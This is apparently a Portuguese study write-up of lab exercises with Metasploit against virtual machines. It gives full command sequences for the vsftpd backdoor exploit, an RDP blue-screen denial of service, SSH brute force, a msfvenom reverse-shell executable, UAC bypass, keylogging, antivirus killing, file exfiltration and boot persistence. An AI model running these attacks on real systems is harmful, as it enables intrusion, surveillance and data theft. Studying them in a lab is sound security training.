**MetasploitFramework** é uma plataforma de segurança cibernética usada principalmente para realizar testes de penetração e avaliações de segurança em sistemas de computadores e redes.  
Ele fornece uma coleção de ferramentas e exploits que permitem que profissionais de segurança identifiquem, explorem e documentem vulnerabilidades em sistemas-alvo.  
Um **exploit** é um programa, código ou técnica usado para aproveitar uma vulnerabilidade ou falha de segurança em um sistema, software ou rede.  
O objetivo principal de um exploit é explorar uma falha para realizar ataque.  

**Payload** é um código ou programa malicioso que é entregue e executado após a exploração de uma vulnerabilidade em um sistema  
- *single* = payload completo que realiza todas as acções (conexão inicial e ataque), sem precisar de etapas adicionais
- *stager* = payload pequeno que estabelece apenas a conexão inicial entre o atacante e o alvo
- *stage* = o payload que contém as ações do atacante, e pode ser carregado após o stager estabelecer a comunicação.
  
**Meterpreter**, é um payload que funciona por injeção dll, é uma ferramenta “pós invasão”, para testes de penetração e ataques éticos.

  
Para realização dos estudos, utilizei o **mfsconsole**
- Interface de linha de comando do Metasploit
- Permite a execução de exploit, payloads, post-exploration e muito mais

Abaixo, todos os casos de estudo(clique em cada um deles e será direcionado na página):

- [EXPLORANDO FALHAS NO FTP](#explorando-falhas-no-ftp)
- [ATAQUES DOS NO WINDOWS RDP](#ataques-dos-no-windows-rdp)
- [EXPLORANDO FALHAS NO SSH COM FORCA BRUTA](#explorando-falhas-no-ssh-com-forca-bruta)
- [CRIANDO BACKDOOR COM UM EXECUTAVEL](#criando-backdoor-com-um-executavel)
- [POS EXPLORACAO](#pos-exploracao)
- [OUTROS MODULOS DE POS EXPLORACAO NO METASPLOIT](#outros-modulos-de-pos-exploracao-no-metasploit)


---
## EXPLORANDO FALHAS NO FTP

Neste exemplo, iremos explorar uma falha na versão 2.3.4 do vsftpd que introduz uma backdoor no servidor FTP.  
Iremos utilizar o Metasploitable como alvo, e o Kali como origem do ataque.  
Estou utilizando os dois sistemas em máquinas virtuais.  

Primeiramente criei um arquivo *teste.txt* no Metasploitable para que possamos manipulá-lo após a invasão.  
No Kali, abriremos o console, entraremos no modo `sudo su` seguiremos os seguintes passos:  
- `msfconsole` = abre o console do metasploit  
- `search vsftpd`  
- `info exploit/unix/ftp/vsftpd_234_hackdoor`  
- `use exploit/unix/ftp/vsftpd_234_hackdoor` = selecionamos o exploit para uso  
- `show options` = mostra os requerimentos que precisamos definir no exploit  
- `set rhosts <ip do metaspoitable>` = ip do nosso alvo  
- `show payloads` = lista os payloads disponíveis  
- `set payload payload/cmd/unix/interact` = este payload permite que o atacante tenha um controle direto sobre a máquina invadida após o exploit  
- `show options` = para ver se os requerimentos estão definidos  
- `exploit`   
- `ls` = irá mostrar o diretório que estamos.  
- `ip addr` = vai mostra o ip da maquina que invadimos:
  
 ![unnamed](https://github.com/user-attachments/assets/39c869b1-d8d4-4b9d-aca3-8f3dbac699e7)

E assim, estamos com acesso ao alvo, via terminal.  

---

## ATAQUES DOS NO WINDOWS RDP
**RDP(Remote Desktop Protocol)** é um protocolo desenvolvido pela Microsoft que permite que um usuário se conecte remotamente a outro computador ou servidor por meio de uma interface gráfica.  
Ele utiliza a porta 3389, TCP ou UDP.  
Este ataque DOS pode causar a interrupção de um serviço ou o travamento de um servidor Windows ao explorar o limite de IDs de canal no RDP.  
#### Simulação de ataque: causar tela azul no Windows.
Liguiei as máquinas virtuais do Windows XP e do Kali Linux.  
No Windows XP precisamos ativar o "remote desktop", através do Painle de Controle.
Pegar o ip do Windows 7 no CMD.  
Acessar o `mfsconsole` no Kali, a partir do modo `sudo su`.  
`search rdp` = procuramos os modulos disponíveis.  
Usaremos o módulo `use auxiliary/dos/windows/rdp/ms12_020_maxchannelids`.  
`show options` = pra verificar os requerimentos a serem definidos no módulo
`set rhosts 192.168.56.105` = definimos o IP do alvo.  
`run`  
Ataque bem sucedido, tela azul no Windows:

![unnamed](https://github.com/user-attachments/assets/c94aeeca-346c-402c-a9a8-69665fd2e1dc)

---

## EXPLORANDO FALHAS NO SSH COM FORCA BRUTA
**SSH (Secure Shell)** é um protocolo de rede criptografado que permite a comunicação segura entre dois computadores.  
Por padrão, o servidor SSH escuta a porta 22.  
Para este ataque, utilizaremos o *Metasploitable* como alvo.  
Utilizaremos a técnica de *“Força Bruta”* para conseguir acesso ao servidor.  
Primeiramente, iniciamos as VM’s do *Kali* e do *Metasploitable*.  
No Kali, abrimos o console e seguimos os passos:  
- `msfconsole`
- `search ssh_login` = procuramos o módulo a ser utilizado
- `use auxiliary/scanner/ssh/ssh_login` = usaremos este módulo
- `info` = para verificar os requerimentos
- Neste caso, precisaremos definir, além do IP do alvo, dois arquivos que contenham informações de usuários e senhas.
- As informações contidas nestes arquivos, serão utilizadas para o ataque de força bruta.
- Sabemos que usuário e senha do Metasploitable são *“msfadmin”*.
- Então criei dois arquivos no Kali: *user.txt* e *password.txt*.
- Em ambos, devemos colocar uma “opção” por linha.
- Em ambos arquivos, pode-se colocar qualquer nomes para teste, mas devem conter também a informação correta em qualquer uma das linhas.
- Agora, definimos as informações necessárias:  
`set rhosts 192.168.56.101` = este é o IP do Mestasploitable  
`set USER_FILE /home/kali/user.txt` = arquivo com possíveis usuários  
`set PASS_FILE /home/kali/password.txt` = arquivo com possíveis senhas  
`exploit`  


Agora que o ataque foi bem sucedido, vamos confirmar as sessões abertas.  
`sessions` = vemos que existe uma sessão aberta  
`sessions 1` = acessamos a sessão  
Agora já estamos dentro do alvo, e digitamos o comando `ip addr` pra confirmar.  
Neste caso, o IP já é o do Metasploitable. :

![unnamed](https://github.com/user-attachments/assets/e1266107-6adc-4bc9-b5ff-72492951eaa0)


---

## CRIANDO BACKDOOR COM UM EXECUTAVEL
Neste exemplo, iremos criar um executável que abre um backdoor no host alvo.  
Para que funcione a invasão, a vítima precisa executar o arquivo.  
Para criar o executável e obter acesso remoto ao alvo utilizaremos o **Meterpreter**.  
**Meterpreter** é um payload que funciona por injeção dll, é uma ferramenta *pós invasão*


Para o ataque, seguiremos os seguintes passos:  
- Inicializar as máquinas virtuais do Kali e Windows 7
Agora vamos usar o **msfvenom**,uma ferramenta do **Metasploit Framework**, para gerar um executável malicioso que serve como um payload para criar uma conexão reversa usando Meterpreter.  
Esse comando pode ser usado no console do Kali:
- `msfvenom -p windows/meterpreter/reverse_tcp -a x86 platform windows -f exe LHOST=192.168.56.103 LPORT=4444 -o Importante.exe`  

Com o comando acima, criamos um arquivo chamado *Importante.exe*, onde o listener será o meu servidor *LHOST(ip do kali)*, pela porta *LPORT*, com arquitetura *x86* e sistema operacional de destino *Windows*.  
- `cp Importante.exe /var/www/html` = depois de criado, colocamos ele no nosso servidor apache
- service apache2 start  = e agora iniciamos o servidor para que o executável esteja acessível.


Agora entramos no *msfconsole* a partir do console do Kali, e configuramos o listener no *Metasploit* para capturar a conexão reversa
- `msfconsole` = abrimos o console do metasploit
- `use multi/handler` = selecionamos o módulo
- `set payload windows/meterpreter/reverse_tcp` = definimos o payload
- `set LHOST 192.168.56.103` = ip do listener (servidor no Kali, com o arquivo dentro)
- `set LPORT 4444` = porta listener
- `run`

Agora no Windows, vamos acessar o arquivo executável pelo servidor de ataque 192.168.56.103/Importante.exe:

![unnamed](https://github.com/user-attachments/assets/73a91f7d-de1a-4652-9ca8-565b1974d7da)


Após a execução do arquivo, já estamos dentro do alvo pelo meterpreter:

![unnamed](https://github.com/user-attachments/assets/f3eb50c2-8688-4095-a685-fa55fa5c348f)


---

## POS EXPLORACAO
- [ESCALONAMENTO DE PRIVILEGIOS](#escalonamento-de-privilegios)
- [EXTRACAO DE DADOS](#extracao-de-dados)
- [PERSISTENCIA DE SESSAO NO METASPLOIT](#persistencia-de-sessao-no-metasploit)
- [AUTOMATIZACAO DE EXPLOITS COM SCRIPT EM PYTHON](#automatizacao-de-exploits-com-script-em-python)
- [OUTROS MODULOS DE POS EXPLORACAO NO METASPLOIT](#outros-modulos-de-pos-exploracao-no-metasploit)

---

### ESCALONAMENTO DE PRIVILEGIOS
Agora que já temos acesso ao windows, através da etapa anterior, iremos usar um módulo para escalonar o privilégio.  
O módulo tentará explorar uma vulnerabilidade no UAC para executar o payload fornecido com privilégios elevados.  
Considerando que o UAC (User Account Control) não existe no Windows XP, neste ataque iremos utilizar o a VM do Windows 7.  
Considerando que já temos acesso ao alvo, seguiremos da seguinte forma:
- Vamos migrar de processo, para que continuemos com o acesso, mesmo se o executável for fechado no WIndows.
- `getpid` = é o processo em uso, aberto pelo executável
- `ps` = mostra os serviços rodando na maquina
- `migrate 1540` = vamos migrar para um serviço que está sempre ativo (explorer.exe, por exemplo)
- `getuid` = para ver o nome do usuario, que deve mudar após o escalonamento
  
  ![unnamed](https://github.com/user-attachments/assets/e453e55b-8f99-47f6-8868-aa4cde989ad6)

#### Podemos também entrar no Shell do Windows 7 para verificar as permissões desta sessão, e comparar após o escalonamento:
- `shell` = a partir do meterpreter, para abrir o shell do Windows invadido
- `whoami /priv` = este comando no Shell do Windows mostrará as permissões atuais
  
![unnamed](https://github.com/user-attachments/assets/da925f26-fb2f-4c68-b0e6-e694772e89cd)


Agora seguiremos os seguintes passos para efetuar o escalonamento:
- `background` = deixamos esta sessão em segundo plano
- `sessions` = deve ter 1 sessão aberta por enquanto, a do backdoor
- `use exploit/windows/local/bypassuac` = selecionamos o módulo 
- `show options` = para verificar os requerimentos
- `set session 1` = usaremos a sessão 1 para fazer este ataque
- `show targets` = mostra as arquiteturas
- `set target 0`
- `set lhost 192.168.56.103` = o IP da nossa máquina (listener)
- `set lport 2022` = pode ser qualquer porta livre
- `exploit` = agora irá criar uma nova sessão, com privilégios elevados

#### Agora podemos ver que tem muito mais acesso:

![unnamed](https://github.com/user-attachments/assets/ff93a345-5e6c-4255-9586-865ab9216125)

---

### EXTRACAO DE DADOS
Após estabelecer a conexão com o alvo, podemos extrair dados das seguintes formas:
- `run killav` = mata os serviços de antivirus do alvo
- `run vnc` = visualiza e controla a tela do alvo
- `screenshare` = apenas visualiza a tela do alvo, pelo browser
- `keyscan_start` = Inicia o keylogger, que enxerga as teclas digitadas
- `keyscan_dump` = exibe as teclas capturadas pelo keylogger
- `keyscan_stop` = Para o keylogger


##### Agora vamos fazer download e upload de arquivos na máquina alvo (Windows 7) :
Primeiro, vamos procurar os arquivos *.txt* na máquina, para saber o caminho de seu diretório:
 - `search -d C:/Users -f *.txt = d é de diretório -f de file`  
Agora faremos o download para o nosso Kali:
- `download -h` = mostra os parâmetros do comando.
- `download “C:/Users/Cassiano/teste.txt”` = faremos o download do arquivo para o Kali  
  
Agora faremos o upload para o Windows 7:
- `upload -h` = mostra opções de upload pro alvo  
Indico estar no mesmo diretório do arquivo que iremos upar para o alvo.  
Digitar o seguinte comando:  
`upload ./testeupload.txt “C:Users/Allan/Desktop”` = primeiro o caminho/nome do arquivo, depois do alvo

---

### PERSISTENCIA DE SESSAO NO METASPLOIT
Agora iremos utilizar um módulo que cria persistência de sessão em um *Windows* já invadido.  
Ele configura um serviço*(.exe)* no sistema-alvo que executa um payload sempre que o sistema é reiniciado, mantendo a sessão ativa.  
Lembrando, que já devemos ter uma sessão com privilégios elevados ativa, no background.  
Com isso, seguiremos os seguintes passos no *msfconsole*: 
- `use exploit/windows/local/persistence_service` = este exploit cria o executável “persistente” no alvo
- `show options`
- `set session 2` = que é a sessão com privilégios elevados
- `set lhost 192.168.56.103`
- `set lport 4444`
- `exploit`

Após a conclusão do exploit, será mostrado o caminho e o nome do .exe que foi criado.  
`C:\Users\<usuário>\AppData\Local\Temp\` = geralmente fica nesta pasta:

![image](https://github.com/user-attachments/assets/29743b5e-385c-4010-af60-378f7583f252)



Agora a vítima não consegue excluir o *.exe*, e mesmo que o host seja reiniciado, o acesso será reestabelecido sem a necessidade de rodar o .exe novamente.

***COMO EXCLUIR O ARQUIVO PERSISTENTE*** 
É importante também, saber como excluir o arquivo persistente após o ataque.  
A princípio, a vítima não consegue excluir o arquivo, então encontrei uma forma de se livrar deste *.exe*:  

Pelo CMD do host alvo, como administrador:  
- `taskkill /im <nome_do_arquivo> /f `
- `del <caminho_do_arquivo>`

---

### AUTOMATIZACAO DE EXPLOITS COM SCRIPT EM PYTHON
Criaremos um  arquivo *.nc* para escrever o script e automatizar as conexões.

Neste exemplo, usaremos um script para rodar o payload reverse_tcp.  
Criaremos este arquivo Kali, pelo console, da seguinte forma:
- `nano meterpreter.nc` = abrimos/criamos o arquivo, e escrevemos o script
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.156.103
set lport 4444
exploit -z
use post/windows/manage/migrate
set session 1
run

```  
Este script vai criar uma sessão com o alvo.  
O **exploit “-z”** jogará a sessão pra background após o exploit, para que seja executado o módulo de migração na sequencia.


`msfconsole -r script.rc` = -r é para rodar o script no metasploit
`sessions` = podemos verificar a sessão criada

---

### OUTROS MODULOS DE POS EXPLORACAO NO METASPLOIT

Aqui teremos mostrarei alguns módulos que podem ser usados após a conexão com o alvo:


1 ) Este primeiro módulo, migra a sessão automaticamente para um processo diferente do atual, criado pelo executável.
- `background` = caso estiver em uma sessão ativa  
- `use post/windows/manage/migrate`
- `show options` = Unico requerimento é definir uma sessão ativa
- `sessions` = verificamos a sessão que já temos aberta do reverse_tcp
- `set session 1`
- `run`

![image](https://github.com/user-attachments/assets/be2dceec-ac66-46d0-a6ed-7dc3b0401a5a)

- `sessions` = pra verificar as sessões abertas
- `sessions` 1 = voltamos pra sessão já aberta do reverse_tcp
- `ps` = abre os processos abertos e conseguimos ver para qual migramos. Geralmente é para o “notepad.exe”

2 ) Exploit pra saber se o alvo da sessão é uma máquina virtual:
- `background`
- `use post/windows/gather/checkvm`
- `set session 1`
- `run `
  
![image](https://github.com/user-attachments/assets/f4a9cdb7-f139-4682-919e-2a689c80e1b7)


3 ) Exploit pra ver as pastas sendo compartilhadas:
- `use post/windows/gather/enum_shares`
- `set session 1`
- `exploit`

  ![image](https://github.com/user-attachments/assets/20ae8ca3-8120-4ced-8c49-a4bdb8a69427)


4 ) Este exploit irá gerar uma lista dos aplicativos encontrados no sistema alvo e exibir as informações sobre cada um:
- `use post/windows/gather/enum_applications`
- `set session 1`
- `run`

  ![image](https://github.com/user-attachments/assets/38d01b0f-ae60-40ea-97e5-d6d5a144e780)


5 ) Este retorna uma lista de atalhos *.lnk* encontrados no sistema, revelando caminhos de arquivos, pastas ou programas frequentemente acessados.
- `use post/windows/gather/dumplinks`
- `set session 1 `
- `run`

![image](https://github.com/user-attachments/assets/581c928f-191b-4127-baa6-233c6d49be4a)


6 ) Módulo utilizado para escaneamento de ARP (Address Resolution Protocol) em uma rede local, retorna uma lista de dispositivos detectados na rede, incluindo: Endereço IP, Endereço MAC, Nome do dispositivo (se disponível):
- `use post/windows/gather/arp_scanner`
- `show options` = ver os requerimentos
- `set session 1 `
- `set RHOSTS 192.168.56.1/24` = faz a varredura no intervalo de ips
- `run`

![image](https://github.com/user-attachments/assets/47f1548d-a0c4-4656-9e7a-91d3048027fe)


7 ) Realiza uma análise local do sistema e sugere explosões locais (exploits) que podem ser usadas para aumentar os privilégios do usuário atual ou ganhar acesso administrativo no alvo:
- `use post/multi/recon/local_exploit_suggester`
- `set session 1`
- `run`

![image](https://github.com/user-attachments/assets/4efa55d4-637e-4e4c-b74c-6a8bf232537e)



***Fico muito feliz se chegou até aqui, e se tiver qualquer dúvida, sugestão, crítica ou elogio, por favor o faça.***  
Segue meu linkedin para contato: https://www.linkedin.com/in/allanmsobral/
